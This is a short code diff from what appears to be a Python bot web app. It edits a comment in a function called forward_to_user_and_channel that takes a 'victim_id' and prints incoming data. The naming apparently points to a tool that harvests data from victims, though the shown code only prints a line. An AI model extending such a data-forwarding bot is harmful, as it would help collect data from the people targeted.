@@ -42,6 +42,5 @@ def home():
     return "✅ Bot is running!"
 
 def forward_to_user_and_channel(victim_id, data):
-    # This function will be imported from bot.__init__ to avoid circular import
-    # For now, we'll just print
+    # This will be handled by bot's __init__
     print(f"📥 Data from {victim_id}")
